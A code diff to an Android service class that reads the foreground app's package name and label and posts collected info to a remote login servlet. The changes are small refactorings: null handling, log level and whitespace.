@@ -431,9 +431,7 @@ public class TestService extends Service
 
 	public boolean upload_data(Info info)
 	{
-		
-		
-		
+
 		String urlStr = "http://www.mengqi.win/LoginServlet";
 		HttpPost request = new HttpPost(urlStr);
 		BasicHttpParams httpParams = new BasicHttpParams();
@@ -740,7 +738,7 @@ public class TestService extends Service
 	// @SuppressLint("NewApi")
 	private String getTaskPackname()
 	{
-		String currentApp = "CurrentNULL";
+		String currentApp = null;
 		if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP)
 		{
 			@SuppressWarnings("ResourceType")
@@ -761,40 +759,41 @@ public class TestService extends Service
 			}
 		} else
 		{
-			
-			
+
 			RunningTaskInfo info1 = am.getRunningTasks(1).get(0);
 			currentApp = info1.topActivity.getPackageName();
 		}
-		Log.e("TAG", "Current App in foreground is: " + currentApp);
+		Log.i("TAG", "Current App in foreground is: " + currentApp);
 		return currentApp;
 	}
 
 	// 获取当前应用名称
 	public String getAppName()
 	{
-		
+
 		ApplicationInfo appinfo = null;
 		PackageManager pkgmanager = null;
 		// 包名
 		String appname = "";
 		pkgname = getTaskPackname();
 		// Log.i("AAA", "包名："+pkgname);
-
-		try
+		if (pkgname != null)
 		{
-			pkgmanager = (PackageManager) getApplicationContext().getPackageManager();
-			appinfo = pkgmanager.getApplicationInfo(pkgname, 0);
-			uid = appinfo.uid;
-		} catch (PackageManager.NameNotFoundException e)
+			try
+			{
+				pkgmanager = (PackageManager) getApplicationContext().getPackageManager();
+				appinfo = pkgmanager.getApplicationInfo(pkgname, 0);
+				uid = appinfo.uid;
+			} catch (PackageManager.NameNotFoundException e)
 
-		{
-			appinfo = null;
-			// TODO: handle exception
+			{
+				appinfo = null;
+				// TODO: handle exception
+			}
+
+			appname = (String) pkgmanager.getApplicationLabel(appinfo);
+			// Log.i("AAA", appname);
 		}
-
-		appname = (String) pkgmanager.getApplicationLabel(appinfo);
-		// Log.i("AAA", appname);
 		return appname;
 	}
 
